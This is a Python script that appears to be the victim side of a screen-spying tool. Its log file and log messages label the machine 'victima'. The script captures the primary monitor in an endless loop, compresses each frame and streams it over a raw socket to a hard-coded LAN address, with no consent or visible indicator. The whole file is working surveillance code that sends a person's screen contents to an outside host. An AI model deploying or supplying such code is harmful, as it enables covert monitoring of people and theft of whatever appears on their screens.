import datetime
import time
import socket
import numpy as np
import logging

from cv2 import cv2
from mss import mss
from zlib import compress
from PIL import Image


logFormatter = logging.Formatter(
    '%(asctime)s.%(msecs)d %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S',
)
LOGGER = logging.getLogger()
LOGGER.setLevel(logging.INFO)

fileHandler = logging.FileHandler('logs/screen_share_victima.log', mode='w')
fileHandler.setFormatter(logFormatter)
LOGGER.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logFormatter)
LOGGER.addHandler(consoleHandler)

FRAME_NUM = 0


def check_time():
    def decorator(func):
        def wrapper(*args, **kwargs):
            start = time.time()
            return_value = func(*args, **kwargs)
            end = time.time()

            LOGGER.info(f'victima:{func.__name__}:{(end - start) * 100:.2f}ms:{FRAME_NUM}')

            return return_value
        return wrapper
    return decorator


def send_screenshots(conn):
    global FRAME_NUM

    @check_time()
    def grab_screen():
        return sct.grab(sct.monitors[1])

    @check_time()
    def process_img():
        img_arr = cv2.resize(np.array(img), (1200, 720))
        img_low_res = Image.fromarray(img_arr, 'RGBA')
        return compress(img_low_res.tobytes())

    @check_time()
    def send_img():
        size = len(pixels)
        size_len = (size.bit_length() + 7) // 8
        conn.send(bytes([size_len]))

        size_bytes = size.to_bytes(size_len, 'big')
        conn.send(size_bytes)

        conn.send(pixels)

    with mss() as sct:
        while 'recording':
            FRAME_NUM += 1
            img = grab_screen()
            pixels = process_img()
            send_img()


def main(host='192.168.0.139', port=9090):
    sock = socket.socket()
    sock.connect((host, port))
    try:
        send_screenshots(sock)
    finally:
        sock.close()

    # try:
    #     while 'connected':
    #         thread = Thread(target=send_screenshots, args=(sock,))
    #         thread.start()
    # finally:
    #     sock.close()


if __name__ == '__main__':
    main()
    # send_screenshots(None)
